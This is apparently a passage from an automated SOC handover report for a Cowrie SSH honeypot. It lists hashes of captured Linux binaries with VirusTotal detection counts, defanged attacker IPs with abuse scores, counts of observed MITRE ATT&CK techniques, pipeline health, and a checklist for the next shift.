| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.212.28[.]141` | IN | National Internet Backbone | **100** ⚠️ | 3 |
| `191.101.59[.]100` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 12 |
| `39.100.183[.]18` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `14.1.104[.]124` | PK | Cyber Internet Services Pakistan | **91** ⚠️ | 0 |
| `202.47.56[.]38` | PK | Cyber Internet Services Pakistan | **73** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 40 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 114 cases |
| Tool 34  | Credential Extractor        | ✅ 40 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 8 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (23.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 7 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 5 recon entry/entries in table (5 group(s) consolidating 75 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-11T12:54:11Z_
